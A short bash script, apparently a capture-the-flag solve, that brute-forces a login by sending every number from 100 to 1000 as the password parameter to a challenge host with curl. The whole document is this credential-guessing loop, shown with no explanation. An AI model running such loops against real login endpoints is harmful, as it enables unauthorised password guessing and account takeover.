#!/bin/bash
for i in {100..1000}
do
  curl -v http://login3.uni.hctf.fun/?passwd=$i
done
